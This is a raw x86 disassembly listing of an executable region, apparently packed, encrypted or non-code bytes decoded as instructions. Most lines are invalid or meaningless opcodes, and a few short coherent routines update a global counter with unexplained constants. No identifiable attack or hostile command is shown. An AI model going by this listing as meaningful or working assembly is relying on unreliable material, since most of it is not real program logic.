  406186:	dec    eax
  406187:	lods   al,BYTE PTR ds:[esi]
  406188:	or     ah,BYTE PTR [eax+0x5ba6b0e]
  40618e:	cmp    ebx,DWORD PTR [ecx-0x44]
  406191:	mov    BYTE PTR [ebx+0x78be706e],cl
  406197:	push   edx
  406198:	pop    eax
  406199:	and    eax,0x2f966f28
  40619e:	imul   edi,DWORD PTR [esi+0x5a],0xffffffa3
  4061a2:	lods   eax,DWORD PTR ds:[esi]
  4061a3:	and    al,0xf5
  4061a5:	les    ebp,FWORD PTR [esi+0x77]
  4061a8:	mov    ds:0x4edd5e11,eax
  4061ad:	dec    esi
  4061ae:	push   0xffffffde
  4061b0:	lds    ebx,FWORD PTR [esi-0x56fea70c]
  4061b6:	push   ebx
  4061b7:	test   BYTE PTR [ecx+ebx*2],dl
  4061ba:	(bad)  
  4061bb:	dec    esp
  4061bc:	(bad)  
  4061bd:	lds    ebp,FWORD PTR [ecx-0x4e58edff]
  4061c3:	mov    DWORD PTR [ebp-0x4c00e79],0xf2c06a38
  4061cd:	fucomp st(2)
  4061cf:	or     eax,0x65e3ce1c
  4061d4:	add    edx,DWORD PTR [edx+0x6587f5e8]
  4061da:	out    0x2e,al
  4061dc:	arpl   WORD PTR [esi],di
  4061de:	mov    DWORD PTR ds:0xaac6bea7,esp
  4061e4:	push   ecx
  4061e5:	xchg   BYTE PTR [ecx],dl
  4061e7:	mov    WORD PTR [edi-0x2f],gs
  4061ea:	(bad)  
  4061ec:	mov    ?,WORD PTR [ebp-0x4b]
  4061ef:	and    edi,DWORD PTR [edi]
  4061f1:	inc    esp
  4061f2:	rcl    BYTE PTR [eax+eax*2-0x532b0616],cl
  4061f9:	xor    al,0x8f
  4061fb:	jbe    0x40621c
  4061fd:	ret    0x4b0e
  406200:	arpl   si,ax
  406202:	inc    esp
  406203:	jmp    0x4061b2
  406205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406206:	fdiv   QWORD PTR [ebx-0x5d]
  406209:	or     esi,esi
  40620b:	mov    esp,0x96684d58
  406210:	mov    WORD PTR [edx],fs
  406212:	mov    ds:0xeba9a68d,eax
  406217:	cld    
  406218:	jecxz  0x4061bf
  40621a:	lods   al,BYTE PTR ds:[esi]
  40621b:	inc    edx
  40621c:	pop    ss
  40621d:	dec    ebx
  40621e:	and    eax,0x5390c71e
  406223:	jae    0x406244
  406225:	mov    dh,BYTE PTR [ecx+0x167714c3]
  40622b:	(bad)
  40622e:	add    ecx,DWORD PTR [esi-0x7c]
  406231:	lock xor eax,0x62e13a20
  406237:	adc    al,0xfa
  406239:	fdiv   DWORD PTR [edx-0x53]
  40623c:	cs jne 0x406273
  40623f:	xlat   BYTE PTR ds:[ebx]
  406240:	das    
  406241:	int3   
  406242:	fsub   QWORD PTR [ebp+0xb]
  406245:	test   DWORD PTR [eax-0x66],0x34cf023d
  40624c:	sar    DWORD PTR [eax+0x25],cl
  40624f:	lahf   
  406250:	(bad)  
  406251:	xor    al,0x0
  406253:	lahf   
  406254:	call   0x39bc0cc
  406259:	aad    0x2e
  40625b:	popf   
  40625c:	mov    ebp,0x4a12d5d2
  406261:	mov    bh,0x8b
  406263:	sbb    edx,esi
  406265:	push   ebp
  406266:	test   BYTE PTR [esi+ebx*1-0x4e963098],al
  40626d:	clc    
  40626e:	and    dh,BYTE PTR [edx-0x503f22e9]
  406274:	sahf   
  406275:	lea    ebp,[ecx-0x7d4597d3]
  40627b:	not    ecx
  40627d:	inc    ecx
  40627e:	jl     0x40626c
  406280:	sub    eax,0x9af5b24d
  406285:	ret    
  406286:	bound  ecx,QWORD PTR [edi-0x37]
  406289:	fistp  WORD PTR [eax-0x74e0831d]
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	mov    esp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi],al
  40629b:	std    
  40629c:	inc    edx
  40629d:	add    BYTE PTR [ecx+0xd090c46],cl
  4062a3:	jae    0x40628b
  4062a5:	inc    edx
  4062a6:	add    BYTE PTR [ebx+0x5c71c45],cl
  4062ac:	repnz cld 
  4062ae:	inc    edx
  4062af:	add    BYTE PTR [esi],bl
  4062b1:	add    BYTE PTR [eax],al
  4062b3:	add    BYTE PTR [ebx+0x42fcf23d],al
  4062b9:	add    BYTE PTR [eax],al
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fcf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e4bb
  4062e2:	cmp    DWORD PTR ds:0x42fcf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fcf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fcf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fcf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fcf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	clc    
  40632f:	leave  
  406330:	jg     0x406357
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062dd
  40633b:	xor    ecx,ecx
  40633d:	(bad)  
  40633e:	sbb    al,0x24
  406340:	xor    eax,edi
  406342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406343:	leave  
  406344:	mov    ebx,0x76370bce
  406349:	sub    al,0x2e
  40634b:	int    0xae
  40634d:	adc    eax,0xd07493b3
  406352:	ins    DWORD PTR es:[edi],dx
  406353:	jle    0x40631c
  406355:	xor    BYTE PTR [edi+0x5b2db51d],ch
  40635b:	mov    cl,0x80
  40635d:	nop
  40635e:	xchg   esp,eax
  40635f:	lea    ebx,[edx+0x5dccac3]
  406365:	mov    ds:0x859c1acf,eax
  40636a:	daa    
  40636b:	mov    edx,0x468f9790
  406370:	dec    esi
  406371:	retf   0x982c
  406374:	sahf   
  406375:	out    dx,eax
  406376:	outs   dx,DWORD PTR ds:[esi]
  406377:	call   0xd625:0x825c41f
  40637e:	jbe    0x406327
  406380:	or     eax,0xada9b52e
  406385:	fcomp  QWORD PTR [edx-0x7adfc264]
  40638b:	cmc    
  40638c:	cmc    
  40638d:	les    esp,FWORD PTR [ecx+ecx*2-0x64]
  406391:	fiadd  DWORD PTR [edx+0x10]
  406394:	jae    0x40636c
  406396:	sub    al,0x14
  406398:	lahf   
  406399:	pop    edx
  40639a:	mov    ebx,0x737bfa7e
  40639f:	int    0x3b
  4063a1:	add    edi,DWORD PTR [ebp+edi*4+0x1c]
  4063a5:	xor    ebp,DWORD PTR es:[ebp+0x71c60257]
  4063ac:	and    DWORD PTR [edi-0x56],edx
  4063af:	add    BYTE PTR [ebp+0x26],0x5
  4063b3:	xor    esi,esi
  4063b5:	pop    eax
  4063b6:	les    esi,FWORD PTR [ecx-0x162ec55]
  4063bc:	mov    bl,0xfb
  4063be:	push   esi
  4063bf:	mov    esi,0x67150786
  4063c4:	or     edx,DWORD PTR [esi*2-0x52df678f]
  4063cb:	popf   
  4063cc:	add    eax,0x8458edb7
  4063d1:	scas   eax,DWORD PTR es:[edi]
  4063d2:	xchg   ecx,eax
  4063d3:	jb     0x40643a
  4063d5:	std    
  4063d6:	pop    ds
  4063d7:	inc    edi
  4063d8:	out    0xb8,eax
  4063da:	sub    eax,0xb4f5b3c2
  4063df:	repnz int3 
  4063e1:	push   ss
  4063e2:	jnp    0x406374
  4063e4:	bound  esi,QWORD PTR [esi+ebp*1]
  4063e7:	retf   0xad5e
  4063ea:	jno    0x406424
  4063ec:	test   dh,bl
  4063ee:	mov    al,0xbf
  4063f0:	xor    ch,BYTE PTR [esi-0x4c999f70]
  4063f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063f7:	and    BYTE PTR [esi+eiz*8+0x5316b142],bh
  4063fe:	jo     0x406440
  406400:	pop    ss
  406401:	push   ebp
  406402:	test   al,0x10
  406404:	lods   eax,DWORD PTR ds:[esi]
  406405:	inc    esi
  406406:	cmc    
  406407:	or     ch,BYTE PTR [esi-0x31bc7bc7]
  40640d:	jle    0x40645e
  40640f:	in     al,0x94
  406411:	cmp    DWORD PTR [ebx+0x78f0cb65],esp
  406417:	sub    DWORD PTR [esi-0x21be3bae],ebx
  40641d:	xor    bl,cl
  40641f:	in     eax,0x27
  406421:	push   ecx
  406422:	jmp    0x406404
  406424:	jbe    0x406434
  406426:	and    cl,BYTE PTR [edx+0x46]
  406429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40642a:	das    
  40642b:	sub    esp,esp
  40642d:	popa   
  40642e:	(bad)  
  40642f:	pop    ecx
  406430:	lock jle 0x406435
  406433:	popf   
  406434:	xchg   ecx,eax
  406435:	call   0xbfabbe09
  40643a:	jb     0x4063e6
  40643c:	jl     0x4063fb
  40643e:	popf   
  40643f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406440:	arpl   WORD PTR [ebx+0x17],dx
  406443:	outs   dx,DWORD PTR ds:[esi]
  406444:	mov    ss,WORD PTR [ebx+0x4804c73b]
  40644a:	mov    WORD PTR [ecx-0x31],?
  40644d:	adc    DWORD PTR [eax-0x4853e1cc],esi
  406453:	jo     0x40646f
  406455:	jg     0x40644a
  406457:	dec    esp
  406458:	std    
  406459:	lock (bad) 
  40645b:	in     al,dx
  40645c:	(bad)  
  40645d:	mov    ebx,0x5fd4d795
  406462:	cwde   
  406463:	loop   0x406481
  406465:	leave  
  406466:	push   edi
  406467:	mov    fs,WORD PTR [ebx]
  406469:	jns    0x4064dc
  40646b:	mov    esi,0x47f32c8d
  406470:	stos   DWORD PTR es:[edi],eax
  406471:	je     0x4064bc
  406473:	fist   WORD PTR [esi+0x4504862d]
  406479:	popf   
  40647a:	mov    bh,0xe3
  40647c:	jmp    0x88c7a92e
  406481:	dec    edi
  406482:	mov    bh,0x95
  406484:	jne    0x406489
  406486:	inc    edi
  406487:	(bad)  
  406488:	es inc ebx
  40648a:	ret    0x8df
  40648d:	xor    eax,0xaf7f25fa
  406492:	xor    al,0x4d
  406494:	test   al,0x77
  406496:	inc    edi
  406497:	inc    ecx
  406498:	jae    0x406493
  40649a:	pusha  
  40649b:	retf   0x9795
  40649e:	int    0x95
  4064a0:	sub    cl,BYTE PTR [esi+0x66]
  4064a3:	sbb    al,0x74
  4064a5:	aam    0x52
  4064a7:	sub    DWORD PTR [ecx-0x43],ebp
  4064aa:	xor    al,0x7c
  4064ac:	test   edi,ecx
  4064ae:	or     BYTE PTR [ecx+0x7e],dh
  4064b1:	dec    edi
  4064b2:	mov    ch,0xc0
  4064b4:	out    dx,al
  4064b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b6:	pop    ss
  4064b7:	(bad)  
  4064b8:	sahf   
  4064b9:	sub    ah,ch
  4064bb:	add    bl,BYTE PTR [ecx+0x7ce3d06b]
  4064c1:	mov    eax,ds:0xccc0f21a
  4064c6:	sbb    eax,0x6c4bd1b8
  4064cb:	jl     0x40645b
  4064cd:	cmc    
  4064ce:	clc    
  4064cf:	lods   al,BYTE PTR ds:[esi]
  4064d0:	sti    
  4064d1:	inc    esp
  4064d2:	leave  
  4064d3:	(bad)  
  4064d4:	repnz (bad) 
  4064d6:	mov    edx,0x16c44f3c
  4064db:	mov    ds:0xaed6a1b2,eax
  4064e0:	out    0xac,al
  4064e2:	mov    bl,0x5e
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fcf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fc79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fcf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fcf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fc59,0x42e67b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	std    
  406567:	inc    esi
  406568:	(bad)  [edx+0x70703a33]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	xchg   ebx,eax
  406573:	mov    bh,0x7
  406575:	sti    
  406576:	mov    ch,0x5c
  406578:	pop    edi
  406579:	clc    
  40657a:	push   ecx
  40657b:	pop    esi
  40657c:	(bad)  
  40657d:	or     eax,0x7a44ee47
  406582:	test   BYTE PTR [edi],dh
  406584:	call   0xd330:0x2bfc7bf2
  40658b:	cli    
  40658c:	push   0xe39c866b
  406591:	mov    cl,0xd2
  406593:	jb     0x4065e4
  406595:	mov    ebx,0x36e11e53
  40659a:	in     al,0x20
  40659c:	into   
  40659d:	pop    edx
  40659e:	js     0x4065ac
  4065a0:	out    0x71,eax
  4065a2:	sub    dl,BYTE PTR [ebx]
  4065a4:	push   es
  4065a5:	imul   eax,DWORD PTR [eax],0xdd1825c7
  4065ab:	fwait
  4065ac:	and    edi,DWORD PTR [eax+0x41]
  4065af:	fadd   DWORD PTR [ebx+0x8a1c6d7]
  4065b5:	std    
  4065b6:	(bad)  
  4065b7:	stc    
  4065b8:	fnstsw WORD PTR [esi]
  4065ba:	mov    eax,ds:0x9d3abd48
  4065bf:	addr16 sti 
  4065c1:	sbb    eax,0xd4c56e68
  4065c6:	pop    es
  4065c7:	and    al,0x37
  4065c9:	or     eax,DWORD PTR [bp-0x30]
  4065cd:	out    dx,eax
  4065ce:	dec    eax
  4065cf:	(bad)  
  4065d0:	sub    eax,ebp
  4065d2:	push   es
  4065d3:	mov    dl,0x13
  4065d5:	xchg   edx,eax
  4065d6:	xchg   DWORD PTR [ebp+0x30],edi
  4065d9:	ret    0xbae2
  4065dc:	xchg   BYTE PTR ds:0xe8909668,dh
  4065e2:	pop    ecx
  4065e3:	mov    al,ds:0x59533f96
  4065e8:	lods   eax,DWORD PTR ds:[esi]
  4065e9:	jg     0x4065e2
  4065eb:	or     ecx,DWORD PTR [ecx-0x4d8da183]
  4065f1:	mov    al,ds:0x641ac22b
  4065f6:	dec    esp
  4065f7:	jge    0x406672
  4065f9:	lea    ebx,gs:[ecx]
  4065fc:	enter  0xaf7e,0xd3
  406600:	int3   
  406601:	ror    bh,1
  406603:	aam    0xef
  406605:	lea    edi,[edx+0x2a]
  406608:	and    al,0x80
  40660a:	cdq    
  40660b:	push   ebx
  40660c:	out    dx,al
  40660d:	xor    BYTE PTR [edi+0x62],dl
  406610:	ret    0x3f32
  406613:	fucomp st(0)
  406615:	pop    esi
  406616:	sub    ebx,DWORD PTR [ecx]
  406618:	(bad)  
  406619:	cdq    
  40661a:	pop    esp
  40661b:	daa    
  40661c:	lock mov eax,ds:0x77d72e02
  406622:	shl    DWORD PTR [edx],cl
  406624:	mov    ah,0xf
  406626:	sti    
  406627:	and    edi,DWORD PTR [ebx+0x23bf5b4a]
  40662d:	inc    esp
  40662e:	jg     0x406660
  406630:	mov    ds:0x684cb8b2,al
  406635:	ss mov dl,0xba
  406638:	in     al,0x71
  40663a:	test   al,0xca
  40663c:	idiv   dh
  40663e:	call   0xa92e3ff2
  406643:	(bad)  
  406644:	push   ds
  406645:	out    0xbb,al
  406647:	add    cl,dh
  406649:	loop   0x4066ca
  40664b:	xor    eax,0x760df8
  406650:	(bad)  
  406652:	mov    dh,bh
  406654:	sbb    DWORD PTR [eax-0x4c6f97a6],0x7
  40665b:	fcmovne st,st(0)
  40665d:	fnsave [eax+ecx*2]
  406660:	fld    QWORD PTR [esi+0x171cbdd8]
  406666:	add    eax,ecx
  406668:	jge    0x406696
  40666a:	aad    0x39
  40666c:	mov    ebp,0xddd74d5d
  406671:	ja     0x4066cb
  406673:	(bad)  
  406675:	sub    bh,BYTE PTR [ecx-0x1b]
  406678:	ja     0x4066ac
  40667a:	jp     0x4066b6
  40667c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40667d:	and    DWORD PTR [ecx-0x14],eax
  406680:	(bad)  
  406681:	xchg   ebp,eax
  406682:	into   
  406683:	add    ah,BYTE PTR [edx-0x5d2b4a71]
  406689:	out    0x45,eax
  40668b:	dec    edi
  40668c:	dec    ecx
  40668d:	icebp  
  40668e:	hlt    
  40668f:	cmp    al,0xc6
  406691:	push   ebp
  406692:	outs   dx,BYTE PTR ds:[esi]
  406693:	(bad)  
  406695:	aam    0xae
  406697:	mov    dh,0xa7
  406699:	jmp    FWORD PTR [edi-0x5588c27e]
  40669f:	test   DWORD PTR [eax-0x67],eax
  4066a2:	loop   0x4066a5
  4066a4:	and    eax,0xb6ed246b
  4066a9:	mov    ebx,ecx
  4066ab:	mov    cl,0x8a
  4066ad:	(bad)  
  4066ae:	adc    eax,esp
  4066b0:	cmp    dh,BYTE PTR [esp+eiz*2-0x19]
  4066b4:	mov    ebx,0x45d4f89b
  4066b9:	stos   BYTE PTR es:[edi],al
  4066ba:	and    BYTE PTR [ebx+edx*4-0x30c762ca],bh
  4066c1:	sbb    BYTE PTR [ecx-0x56021a3e],bl
  4066c7:	sti    
  4066c8:	add    bl,BYTE PTR [eax-0x2ea947da]
  4066ce:	ret    
  4066cf:	jge    0x406747
  4066d1:	shr    al,cl
  4066d3:	arpl   WORD PTR [ebx-0x2772e8a9],dx
  4066d9:	pop    edi
  4066da:	in     al,dx
  4066db:	adc    DWORD PTR [esi+0x40],edx
  4066de:	int    0x1e
  4066e0:	(bad)  
  4066e1:	ins    DWORD PTR es:[edi],dx
  4066e2:	les    ecx,FWORD PTR [ebx]
  4066e4:	push   ebp
  4066e5:	inc    esp
  4066e6:	sub    DWORD PTR [eax-0x6d],0x8d4c3fc8
  4066ed:	repnz inc edi
  4066ef:	fs mov edi,0xeee69aec
  4066f5:	jmp    0x46f4:0xef31846c
  4066fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066fd:	push   esp
  4066fe:	sub    esp,ebx
  406700:	xor    eax,0xcae7de0a
  406705:	add    cl,BYTE PTR ds:0x66526858
  40670b:	mov    bh,0x55
  40670d:	(bad)  
  40670e:	and    dh,dh
  406710:	rcr    BYTE PTR [ebx-0x43],cl
  406713:	cdq    
  406714:	add    edx,DWORD PTR [esi-0x13]
  406717:	out    dx,al
  406718:	dec    edi
  406719:	xchg   ebp,eax
  40671a:	pop    edx
  40671b:	int    0xa9
  40671d:	push   ss
  40671e:	xchg   esi,eax
  40671f:	int    0xf9
  406721:	test   BYTE PTR [edi+0x55],0xbc
  406725:	call   0x2d82617c
  40672a:	mov    ah,0x59
  40672c:	pop    ss
  40672d:	data16 ss jno 0x406771
  406731:	pushf  
  406732:	aaa    
  406733:	adc    al,0xcc
  406735:	xchg   ecx,eax
  406736:	mov    bh,0xd1
  406738:	addr16 xchg esi,eax
  40673a:	jnp    0x406790
  40673c:	add    BYTE PTR [ebx],0xea
  40673f:	lods   eax,DWORD PTR ss:[esi]
  406741:	or     ah,bl
  406743:	jg     0x4066ca
  406745:	in     al,dx
  406746:	loop   0x406741
  406748:	sbb    bl,BYTE PTR [eax]
  40674a:	push   ds
  40674b:	mov    cl,0x74
  40674d:	dec    esi
  40674e:	cdq    
  40674f:	fwait
  406750:	jmp    0x32651815
  406755:	int    0xe9
  406757:	retf   0x64ce
  40675a:	pop    edx
  40675b:	shr    BYTE PTR [edi+0x50],0x4d
  40675f:	mov    al,0x7a
  406761:	xlat   BYTE PTR ds:[ebx]
  406762:	sbb    bl,dl
  406764:	xor    eax,0x3e2dbb4a
  406769:	repz inc esi
  40676b:	sbb    al,0xc6
  40676d:	jge    0x406732
  40676f:	sbb    al,0x72
  406771:	jmp    0x86f3:0xb312cb47
  406778:	push   ebx
  406779:	and    DWORD PTR [edi+ecx*1-0x58],edi
  40677d:	xlat   BYTE PTR ss:[ebx]
  40677f:	dec    ebp
  406780:	add    BYTE PTR [edx],dh
  406782:	mov    bh,0x2d
  406784:	in     eax,0xbb
  406786:	adc    DWORD PTR [edx],esi
  406788:	dec    BYTE PTR [ecx]
  40678a:	push   eax
  40678b:	das    
  40678c:	push   0xffffffb8
  40678e:	mov    bh,0xb2
  406790:	pop    ss
  406791:	imul   ecx,DWORD PTR [eax],0x6c
  406794:	mul    BYTE PTR [ebx]
  406796:	mov    bh,0x32
  406798:	sub    al,0x2f
  40679a:	ds dec edi
  40679c:	aam    0xc4
  40679e:	(bad)  
  40679f:	loop   0x40675f
  4067a1:	repz daa 
  4067a3:	mov    ebp,DWORD PTR [edi-0xb]
  4067a6:	mov    ecx,0x5b2a45aa
  4067ab:	mov    al,ds:0x25b5b1f7
  4067b0:	xor    al,0x6e
  4067b2:	ret    0x1753
  4067b5:	push   edi
  4067b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067b7:	mov    ebp,0x50fe8b47
  4067bc:	jl     0x406757
  4067be:	lock (bad) 
  4067c1:	hlt    
  4067c2:	pop    ecx
  4067c3:	sub    al,0xc8
  4067c5:	xlat   BYTE PTR ds:[ebx]
  4067c6:	das    
  4067c7:	push   0x3d
  4067c9:	xchg   ecx,eax
  4067ca:	xor    edx,DWORD PTR [bp-0x3769]
  4067cf:	mov    edi,0x6b89e398
  4067d4:	rcl    BYTE PTR [eax-0x3c4db5ca],1
  4067da:	ins    BYTE PTR es:[edi],dx
  4067db:	jmp    0x4067fe
  4067dd:	mov    bl,0x2
  4067df:	test   DWORD PTR [ebx+0x42891055],ecx
  4067e5:	or     BYTE PTR [ebx],dh
  4067e7:	ret    0x458b
  4067ea:	sbb    al,0x8b
  4067ec:	push   ebp
  4067ed:	adc    BYTE PTR [ecx+0x42fc5515],al
  4067f3:	add    BYTE PTR [esi],bh
  4067f5:	sbb    al,BYTE PTR [eax]
  4067f7:	add    BYTE PTR [ecx+0x458b0c42],cl
  4067fd:	and    BYTE PTR [ecx+0x42e0a00d],al
  406803:	add    BYTE PTR [ebx],dl
  406805:	jne    0x406807
  406807:	add    BYTE PTR [ebx+0x2d811055],cl
  40680d:	jnp    0x4067f5
  40680f:	inc    edx
  406810:	add    dh,al
  406812:	jbe    0x406814
  406814:	add    BYTE PTR [ecx+0x25811042],cl
  40681a:	gs cld 
  40681c:	inc    edx
  40681d:	add    BYTE PTR [ebx-0x74ffbd1a],dl
  406823:	ror    BYTE PTR [ebx-0x3f7aebbb],0x8b
  40682a:	inc    ebp
  40682b:	or     BYTE PTR [edi],cl
  40682d:	test   DWORD PTR [esi-0x74fffffe],ecx
  406833:	inc    ebp
  406834:	or     al,0xe9
  406836:	xchg   BYTE PTR [edx],al
  406838:	add    BYTE PTR [eax],al
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	or     edi,eax
  406848:	inc    esp
  406849:	out    0xa5,eax
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	ror    BYTE PTR [edi],0x66
  406855:	jmp    0x18f113cb
  40685a:	fwait
  40685b:	bound  esp,QWORD PTR [edx-0x2fb7406b]
  406861:	test   eax,0xa849257e
  406866:	and    DWORD PTR [eax],eax
  406868:	xchg   esi,eax
  406869:	test   eax,0x4d0c0d86
  40686e:	mul    DWORD PTR [edi]
  406870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406871:	pop    esp
  406872:	je     0x40687b
  406874:	aaa    
  406875:	jnp    0x4068be
  406877:	enter  0x5f58,0xf3
  40687b:	and    esp,eax
  40687d:	or     BYTE PTR [eax-0x62],dl
  406880:	arpl   WORD PTR ds:0x79b7ac00,di
  406886:	and    dh,ch
  406888:	pop    ss
  406889:	arpl   sp,si
  40688b:	pop    esp
  40688c:	retf   
  40688d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40688e:	push   ds
  40688f:	push   ebx
  406890:	(bad)  [edx-0x27]
  406893:	ins    DWORD PTR es:[edi],dx
  406894:	repnz dec esp
  406896:	mov    ebx,0xebb7b166
  40689b:	mov    es,WORD PTR [edi+0x3e3470bd]
  4068a1:	cli    
  4068a2:	(bad)  
  4068a3:	hlt    
  4068a4:	add    al,0x37
  4068a6:	adc    eax,0xd7f619d2
  4068ab:	sbb    eax,0xcfb449dc
  4068b0:	in     eax,0xdf
  4068b2:	jb     0x406890
  4068b4:	mov    bh,0xfa
  4068b6:	iret   
  4068b7:	sti    
  4068b8:	imul   esp,ebp,0xb84e5230
  4068be:	retf   0x3153
  4068c1:	mov    cs,WORD PTR ds:[ebp+0x1c]
  4068c5:	cmp    DWORD PTR [ebx],edi
  4068c7:	fild   QWORD PTR [ebx-0x64]
  4068ca:	data16 fbstp TBYTE PTR [esp+eax*1]
  4068ce:	mov    ch,0x6
  4068d0:	out    dx,al
  4068d1:	daa    
  4068d2:	in     eax,0x1e
  4068d4:	fidiv  DWORD PTR [eax]
  4068d6:	and    al,BYTE PTR ds:0xc59308f5
  4068dc:	sbb    al,0x9a
  4068de:	jge    0x4068ff
  4068e0:	stos   BYTE PTR es:[edi],al
  4068e1:	retf   0xd5d4
  4068e4:	mov    dh,0x61
  4068e6:	cmc    
  4068e7:	sahf   
  4068e8:	mov    WORD PTR [edx+eax*1+0x6e],?
  4068ec:	jne    0x406935
  4068ee:	iret   
  4068ef:	fdivp  st(5),st
  4068f1:	or     eax,0xd2b46021
  4068f6:	in     al,0xc8
  4068f8:	xchg   ebp,eax
  4068f9:	mov    edi,0xbaa1d85e
  4068fe:	inc    esp
  4068ff:	dec    ebp
  406900:	xchg   esi,eax
  406901:	rcr    bh,cl
  406903:	dec    ecx
  406904:	nop
  406905:	fnstcw WORD PTR [esi+edx*8+0x59]
  406909:	inc    esp
  40690a:	ins    DWORD PTR es:[edi],dx
  40690b:	sub    al,0x3b
  40690d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40690e:	and    al,0x30
  406910:	jmp    0x846f:0x8e600704
  406917:	test   BYTE PTR [ecx],bh
  406919:	inc    esp
  40691a:	aad    0x2
  40691c:	call   0x9226f65a
  406921:	loopne 0x40691d
  406923:	ss or  eax,0xb0ff85b8
  406929:	pop    esp
  40692a:	arpl   sp,di
  40692c:	push   ebp
  40692d:	mov    esp,0xa846d561
  406932:	imul   DWORD PTR [ebp+0x60]
  406935:	in     eax,dx
  406936:	out    dx,al
  406937:	push   es
  406938:	(bad)  
  406939:	in     eax,0xea
  40693b:	add    bl,ah
  40693d:	push   esi
  40693e:	jae    0x4068ed
  406940:	cmp    eax,0xb85c248d
  406945:	mov    ds:0x74d8af27,eax
  40694a:	push   cs
  40694b:	out    dx,eax
  40694c:	add    al,0x5b
  40694e:	(bad)  
  40694f:	std    
  406950:	add    DWORD PTR [edi+eax*2],ebx
  406953:	(bad)  
  406954:	dec    ecx
  406955:	std    
  406956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406957:	scas   eax,DWORD PTR es:[edi]
  406958:	lds    esp,FWORD PTR [esi+0x69c69267]
  40695e:	and    eax,0xac362dc7
  406963:	mov    ah,0xa4
  406965:	cli    
  406966:	ds adc al,0x13
  406969:	sub    eax,0xa4e2fc65
  40696e:	xor    DWORD PTR [esi],0xdbbd21d7
  406974:	scas   al,BYTE PTR es:[edi]
  406975:	xchg   esi,eax
  406976:	or     al,0xf9
  406978:	in     eax,0xe3
  40697a:	out    0xd0,eax
  40697c:	cli    
  40697d:	inc    ebx
  40697e:	or     BYTE PTR [ecx],dl
  406980:	mov    ecx,0x87500eef
  406985:	and    eax,0x8c0f362d
  40698a:	mov    eax,0xe8aa9253
  40698f:	js     0x406a05
  406991:	push   ecx
  406992:	dec    edi
  406993:	add    BYTE PTR [ebx+0x70],0x5b
  406997:	mov    al,0x6a
  406999:	fdivr  st(0),st
  40699b:	jg     0x4069a1
  40699d:	and    al,0xbc
  4069a0:	ds pop ds
  4069a2:	pop    ss
  4069a3:	(bad)  
  4069a4:	loope  0x40695c
  4069a6:	cmp    al,0xb0
  4069a8:	mov    WORD PTR [ebp+ebp*8+0x3224833f],cs
  4069af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
